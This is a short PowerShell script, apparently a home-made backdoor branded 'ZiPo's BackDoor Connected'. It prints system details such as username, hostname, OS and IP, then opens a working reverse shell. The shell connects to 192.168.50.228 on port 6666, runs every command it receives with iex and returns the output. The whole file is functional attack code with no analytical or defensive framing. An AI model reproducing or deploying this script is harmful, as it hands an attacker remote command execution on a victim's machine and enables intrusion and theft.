$Host.UI.RawUI.ForegroundColor = "Red"
Write-Host "
███████╗██╗██████╗  ██████╗ ███████╗
██╔════╝██║██╔══██╗██╔════╝ ██╔════╝
███████╗██║██████╔╝██║  ███╗█████╗  
╚════██║██║██╔═══╝ ██║   ██║██╔══╝  
███████║██║██║     ╚██████╔╝███████╗
╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝
      ZiPo's BackDoor Connected
" -ForegroundColor Red

$Host.UI.RawUI.ForegroundColor = "Green"

# Вывод базовой инфы о системе
Write-Host "Username: $env:USERNAME"
Write-Host "Computer: $env:COMPUTERNAME"
Write-Host "OS: $([System.Environment]::OSVersion.VersionString)"
Write-Host "Architecture: $env:PROCESSOR_ARCHITECTURE"
Write-Host "IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString)"
Write-Host "`n---------------------------------------------------`n"

# Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};$client.Close()
